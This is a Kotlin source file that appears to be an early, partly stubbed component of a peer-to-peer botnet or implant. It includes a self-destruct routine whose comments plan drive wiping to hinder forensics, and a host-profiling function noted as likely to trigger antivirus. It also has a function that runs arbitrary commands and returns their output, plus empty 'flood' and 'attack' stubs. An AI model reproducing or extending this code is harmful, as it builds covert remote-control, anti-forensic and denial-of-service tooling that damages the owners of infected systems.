/**
 * Copyright 2022 (c) Ur Nan
 *
 * This code is distributed under the GNU GPL Version 2.
 * For details, please read the LICENSE file.
 *
 */
package cc.telepath.rhizome

import fr.rhaz.sockets.Connection
import fr.rhaz.sockets.MultiSocket
import fr.rhaz.sockets.jsonMap
import fr.rhaz.sockets.toJson
import java.io.File
import java.util.HashMap


/**
 * Let's think about what our goals are for self-destruction.
 * We want to support 2 modes: Cleanup and Scorched Earth
 *
 * Cleanup: Remove all identified components including all traces of activity
 *
 * Destruction: Completely fuck the system, make forensics harder
 *
 * Returns true on success
 *
 */
fun selfDestruct(scorchEarth: Boolean): Boolean{

    if(!scorchEarth){
        val runpath: String = System.getProperty("user.dir")
        val jarName: String = System.getProperty("java.class.path")
        println(jarName)
        val f: File = File(jarName.substring(2))
        return f.delete()
    }
    else{
        // So basically we need to identify the OS and 0fill the drive
        // How we do this depends on the OS. If *nix, use DD. If Windows, use format /p:4
    }
    return false
}

/**
 * Tell us about the machine we're on.
 *
 * TODO: Find a better way of identifying the system we're on. Currently this method will set off AV.
 * TODO: If we simply check for the existence of certain files we may be better off
 */
fun machineStats(): jsonMap {

    val machineInfo: HashMap<String, String> = HashMap<String, String>()
    machineInfo.put("OSName", System.getProperty("os.name"))
    machineInfo.put("OSVersion", System.getProperty("os.version"))
    machineInfo.put("NumProcessors", Runtime.getRuntime().availableProcessors().toString())
    machineInfo.put("Username", System.getProperty("user.name"))
    machineInfo.put("UserHome", System.getProperty("user.home"))
    machineInfo.put("AvailableRAM", Runtime.getRuntime().totalMemory().toString())

    return jsonMap(machineInfo)
}

/**
 * Get information about a node's peers
 */
fun neighborStats(node: MultiSocket): jsonMap{
    val neighborInfo: HashMap<String, String> = HashMap<String, String>()
    neighborInfo.put("Numpeers", node.connectionsByTarget.size.toString())

    for(c in node.connectionsByTarget){
        neighborInfo.put(c.value.targetName, c.value.targetAddress)
    }
    return jsonMap(neighborInfo)
}

fun blockNode(params: List<Pair<String,String>>){

}


/**
 * We need some wrapper logic to determine if file is present.
 * If not, request from other peers.
 */
fun getFile(hash: String){


}

/**
 * Shit, this is going to be complicated. How should this work?
 */
fun shareFile(params: List<Pair<String,String>>){

}

fun execute(commandString: String): String {
    val p = Runtime.getRuntime().exec(commandString)
    val output = p.inputStream.bufferedReader().use { it.readText() }
    return output
}

fun flood(params: List<Pair<String,String>>){

}

fun attack(params: List<Pair<String,String>>){

}